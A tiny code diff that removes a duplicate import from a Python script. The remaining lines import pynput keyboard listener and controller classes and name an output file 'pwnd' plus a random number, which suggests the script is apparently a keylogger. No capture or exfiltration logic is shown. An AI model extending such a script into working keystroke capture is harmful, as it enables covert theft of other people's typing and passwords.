@@ -1,5 +1,4 @@
 import random
-from random import randint
 from pynput.keyboard import Key, Listener, Controller
 
 output = 'pwnd' + str(random.randint(312, 33345345453453453455344534533453453453453453455)) + '.txt'
